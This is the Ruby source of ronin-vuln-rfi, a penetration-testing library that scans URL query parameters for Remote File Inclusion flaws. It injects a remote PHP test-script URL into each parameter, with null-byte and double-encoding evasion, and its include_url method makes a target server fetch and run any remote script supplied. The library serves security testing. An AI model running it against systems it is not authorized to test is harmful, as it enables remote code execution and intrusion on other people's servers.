#
# ronin-vuln-rfi - A small Ruby library for testing Remote File Inclusion (RFI)
# vulnerabilities.
#
# Copyright (c) 2007-2022 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-vuln-rfi is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-vuln-rfi is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-vuln-rfi.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/support/network/http'
require 'uri/query_params'

module Ronin
  module Vuln
    class RFI

      # Default URL of the Remote File Inclusion (RFI) Test script.
      TEST_SCRIPT_URL = 'https://raw.githubusercontent.com/ronin-rb/ronin-vuln-rfi/main/data/test.php'

      # The string that will be returned if the Remote File Inclusion (RFI)
      # script is executed.
      VULN_RESPONSE_STRING = "Remote File Inclusion (RFI) Detected: eval(\"1 + 1\") = 2"

      # The url to test or was found to be vulnerable.
      #
      # @return [URI::HTTP]
      attr_reader :url

      # The query parameter to test or was found to be vulnerable.
      #
      # @return [String]
      attr_reader :param

      # The evasion technique to use.
      #
      # @return [nil, :null_byte, :double_encode]
      attr_reader :evasion

      # URL of the Remote File Inclusion (RFI) Test script
      # 
      # @return [String, URI::HTTP]
      attr_reader :test_script_url

      #
      # Creates a new Remote File Inclusion (RFI) object.
      #
      # @param [String, URI::HTTP] url
      #   The URL to attempt to exploit.
      #
      # @param [String, Symbol] param
      #   The query parameter to attempt RFI on.
      #
      # @param [nil, :null_byte] evasion
      #   Specifies which evasion technique to use.
      #   * `:null_byte` will cause the inclusion URL to be appended with a
      #     `%00` character.
      #   * `:double_encode` will cause the inclusion URL to be URI escaped
      #     twice.
      #
      # @param [String, URI::HTTP] test_script_url
      #   The URL of the RFI test script.
      #
      # @param [Ronin::Support::Network::HTTP, nil] http
      #   An optional HTTP session to use for testing the RFI.
      #
      # @param [Symbol] method
      #   The HTTP request method to use.
      #
      # @param [Hash{String => Object}, nil] headers
      #   Additional headers to send with any HTTP request.
      #
      def initialize(url,param, test_script_url: self.class.test_script_url,
                                evasion:         nil,
                                # http keyword arguments
                                http:    nil,
                                method:  :get,
                                headers: nil)
        @url   = URI(url)
        @param = param.to_s

        @test_script_url = test_script_url
        @evasion     = evasion

        @http    = http || Support::Network::HTTP.connect_uri(@url)
        @method  = method
        @headers = headers
      end

      #
      # Specifies the URL to the Remote File Inclusion (RFI) testing script.
      #
      # @return [String]
      #   The URL to the RFI testing script.
      #
      def self.test_script_url
        @test_script_url ||= TEST_SCRIPT_URL
      end

      #
      # Uses a new URL for the Remote File Inclusion (RFI) testing script.
      #
      # @param [String] new_url
      #   The new URL to the RFI testing script.
      #
      # @return [String]
      #   The new URL to the RFI testing script.
      #
      def self.test_script_url=(new_url)
        @test_script_url = new_url
      end

      #
      # Scans the URL for Remote File Inclusion (RFI) vulnerabilities.
      #
      # @param [URI::HTTP, String] url
      #   The URL to test.
      #
      # @param [String, Symbol] param
      #   The query parameter to test.
      #
      # @param [Ronin::Support::Network::HTTP, nil] http
      #   An optional HTTP session to use for testing the RFI.
      #
      # @param [nil, :null_byte, :double_encode] evasion
      #   Optional evasion technic to specifically use.
      #   Defaults to testing all evasion techniques.
      #
      # @param [Hash{Symbol => Object}] kwargs
      #   Additional keyword arguments for {#initialize}.
      #
      # @return [RFI, nil]
      #   The first discovered RFI vulnerability.
      #
      def self.test_query_param(url,param, http: nil, evasion: nil, **kwargs)
        url    = URI(url)
        http ||= Support::Network::HTTP.connect_uri(url)


        evasions = if evasion then [evasion]
                   else            [nil, :null_byte, :double_encode]
                   end

        evasions.each do |evasion|
          rfi = self.new(url,param, http: http, evasion: evasion, **kwargs)

          return rfi if rfi.vulnerable?
        end

        return nil
      end

      #
      # Tests all query parameters in the URL for Remote File Inclusion (RFI)
      # vulnerabilities.
      #
      # @param [URI::HTTP, String] url
      #   The URL to scan.
      #
      # @param kwargs [Ronin::Support::Network::HTTP, nil] http
      #   An optional HTTP session to use for testing the RFI.
      #
      # @param [Hash{Symbol => Object}] kwargs
      #   Additional keyword arguments for {test_query_param}.
      #
      # @yield [rfi]
      #   If a block is given, it will be passed each newly discovered RFI
      #   vulnerability.
      #
      # @yieldparam [RFI] rfi
      #   A newly discoverd RFI vulnerability in one of the URL's query
      #   parameters.
      #
      # @return [Array<RFI>]
      #   All discovered RFI vulnerabilities.
      #
      def self.scan(url, http: nil, **kwargs)
        url    = URI(url)
        http ||= Support::Network::HTTP.connect_uri(url)
        vulns = []

        url.query_params.each_key do |param|
          if (rfi = test_query_param(url,param, http: http, **kwargs))
            yield rfi if block_given?
            vulns << rfi
          end
        end

        return vulns
      end

      #
      # Tests the URL for Remote File Inclusion (RFI).
      #
      # @param [Hash{Symbol => Object}] kwargs
      #   Additional keyword arguments for {scan}.
      #
      # @option kwargs [Ronin::Support::Network::HTTP, nil] http
      #   An optional HTTP session to use for testing the RFI.
      #
      # @param [URI::HTTP, String] url
      #   The URL to test.
      #
      # @return [RFI, nil]
      #   The first discovered RFI vulnerability.
      #
      def self.test(url,**kwargs)
        scan(url,**kwargs) do |rfi|
          return rfi
        end
      end

      #
      # Builds a Remote File Inclusion (RFI) URL.
      #
      # @param [String, URI::HTTP] rfi_url
      #   The URL of the PHP script to include remotely.
      #
      # @param [Hash{String,Symbol => #to_s}] additional_params
      #   Additional query parameters to add to the RFI URL.
      #
      # @return [URI::HTTP]
      #   The URL to use to trigger the RFI.
      #
      def url_for(rfi_url,additional_params={})
        rfi_url = rfi_url.to_s
        new_url = @url.clone
        new_url.query_params.merge!(additional_params)

        case @evasion
        when :null_byte
          # Optionally append a null-byte
          # NOTE: uri-query_params will automatically URI encode the null byte
          rfi_url = "#{rfi_url}\0"
        when :double_encode
          # Optionally double URI encodes the script URL
          rfi_url = URI::QueryParams.escape(rfi_url)
        end

        new_url.query_params[@param.to_s] = rfi_url
        return new_url
      end

      #
      # Performs a Remote File Inclusion (RFI).
      #
      # @param [String, URI::HTTP] rfi_url
      #   The URL of the PHP script to include remotely.
      #
      # @return [String]
      #   The body of the response from the RFI.
      #
      def include_url(rfi_url)
        url = url_for(rfi_url)

        @http.response_body(@method, url.path, query:   url.query,
                                               headers: @headers)
      end

      #
      # Tests whether the URL and query parameter are vulnerable to Remote File
      # Inclusion (RFI).
      #
      # @return [Boolean]
      #   Specifies whether the URL and query parameter are vulnerable to RFI.
      #
      def vulnerable?
        response = include_url(@test_script_url)

        return response.include?(VULN_RESPONSE_STRING)
      end

    end
  end
end
